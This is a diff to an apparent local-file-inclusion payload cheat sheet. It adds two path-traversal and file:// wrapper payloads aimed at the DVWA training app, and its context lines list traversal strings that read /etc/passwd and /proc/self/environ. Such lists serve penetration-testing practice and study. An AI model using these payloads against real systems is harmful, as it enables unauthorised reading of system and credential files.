@@ -19,6 +19,8 @@
   - ```example1.php?page=intro.php../../../../../etc/passwd```
   - ```example2.php?page=intro../../../../../../../../../../etc/passwd%00``` 
   - ```example2.php?page=intro%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00``` 
+  - ```localhost/dvwa/vulnerabilities/fi/?page=..././..././phpinfo.php```
+  - ```localhost/dvwa/vulnerabilities/fi/?page=file:////opt/lampp/htdocs/dvwa/phpinfo.php```
 
 ## Intersting files
   - ```/proc/self/environ```
